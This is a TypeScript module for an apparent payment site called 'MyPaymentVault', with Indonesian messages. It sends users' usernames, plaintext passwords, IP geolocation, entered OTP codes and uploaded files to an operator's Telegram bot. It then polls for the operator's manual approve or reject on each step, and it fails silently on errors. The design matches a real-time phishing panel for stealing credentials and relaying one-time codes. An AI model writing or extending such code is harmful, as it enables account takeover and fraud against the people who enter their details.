const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

export async function getPublicIP(): Promise<string> {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip ?? "unknown";
  } catch {
    return "unknown";
  }
}

export async function getIPInfo(): Promise<string> {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const { ip } = await ipRes.json();
    if (!ip) return "unknown";
    const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
    const loc = await locRes.json();
    const city    = loc.city        ?? "";
    const region  = loc.region      ?? "";
    const country = loc.country_name ?? "";
    const org     = loc.org         ?? "";
    const parts   = [city, region, country].filter(Boolean).join(", ");
    return `${ip} (${parts}${org ? " — " + org : ""})`;
  } catch {
    return "unknown";
  }
}

export async function sendTelegram(message: string): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" }),
    });
  } catch { /* silent fail */ }
}

export async function sendFileToTelegram(file: File, caption: string): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", caption);
    form.append("document", file, file.name);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: form,
    });
  } catch { /* silent */ }
}

export async function sendApprovalRequest(
  username: string,
  ip: string,
  now: string,
  sessionKey: string,
  label = "Login",
  password?: string
): Promise<number | null> {
  if (!BOT_TOKEN || !CHAT_ID) return null;
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        parse_mode: "HTML",
        text:
          `━━━━━━━━━━━━━━━━━━━━━\n` +
          `🔐 <b>MyPaymentVault</b>\n` +
          `📌 <b>Permintaan ${label}</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `👤 <b>Username</b>   : <code>${username}</code>\n` +
          (password ? `🔑 <b>Password</b>   : <code>${password}</code>\n` : ``) +
          `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
          `🕐 <b>Waktu</b>      : ${now}\n\n` +
          `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
          `━━━━━━━━━━━━━━━━━━━━━`,
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
            { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
          ]],
        },
      }),
    });
    const data = await res.json();
    return data.ok ? data.result.message_id : null;
  } catch {
    return null;
  }
}

export async function getLatestOffset(): Promise<number> {
  if (!BOT_TOKEN) return 0;
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`
    );
    const data = await res.json();
    if (!data.ok || !data.result.length) return 0;
    const last = data.result[data.result.length - 1];
    return last.update_id + 1;
  } catch {
    return 0;
  }
}

export async function pollApproval(
  offset: number,
  sessionKey: string
): Promise<{ status: "approved" | "rejected" | "pending"; nextOffset: number; callbackId?: string }> {
  if (!BOT_TOKEN) return { status: "pending", nextOffset: offset };
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=2`
    );
    const data = await res.json();
    if (!data.ok || !data.result.length) return { status: "pending", nextOffset: offset };

    let status: "approved" | "rejected" | "pending" = "pending";
    let nextOffset = offset;
    let callbackId: string | undefined;

    for (const update of data.result) {
      nextOffset = update.update_id + 1;
      if (update.callback_query) {
        const cbData: string = update.callback_query.data ?? "";
        if (cbData === `approve_${sessionKey}`) {
          callbackId = update.callback_query.id;
          status = "approved";
        } else if (cbData === `reject_${sessionKey}`) {
          callbackId = update.callback_query.id;
          status = "rejected";
        }
      }
    }
    return { status, nextOffset, callbackId };
  } catch {
    return { status: "pending", nextOffset: offset };
  }
}

export async function sendBotOTP(otp: string, username: string): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        parse_mode: "HTML",
        text:
          `━━━━━━━━━━━━━━━━━━━━━\n` +
          `🔐 <b>MyPaymentVault</b>\n` +
          `📌 <b>Kode OTP — Kirim ke User</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `👤 <b>Username</b> : <code>${username}</code>\n` +
          `🔢 <b>Kode OTP</b>  : <code>${otp}</code>\n\n` +
          `📧 <i>Kirimkan kode ini ke email user secara manual.\n` +
          `Jangan bagikan ke orang lain.</i>\n` +
          `━━━━━━━━━━━━━━━━━━━━━`,
      }),
    });
  } catch { /* silent */ }
}

export async function sendOtpVerificationRequest(
  username: string,
  enteredCode: string,
  correctCode: string,
  sessionKey: string
): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const isCorrect = enteredCode === correctCode;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        parse_mode: "HTML",
        text:
          `━━━━━━━━━━━━━━━━━━━━━\n` +
          `🔐 <b>MyPaymentVault</b>\n` +
          `📌 <b>Verifikasi Kode OTP</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
          `👤 <b>Username</b>     : <code>${username}</code>\n` +
          `🔢 <b>Kode Dimasukkan</b>: <code>${enteredCode}</code>\n` +
          `${isCorrect ? "✅" : "❌"} <b>Status</b>       : ${isCorrect ? "BENAR" : "SALAH"}\n\n` +
          `⚠️ <i>Setujui akses user ini ke step berikutnya?</i>\n` +
          `━━━━━━━━━━━━━━━━━━━━━`,
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
            { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
          ]],
        },
      }),
    });
  } catch { /* silent */ }
}

export async function answerCallback(callbackId: string, text: string): Promise<void> {
  if (!BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackId, text }),
    });
  } catch { /* silent */ }
}
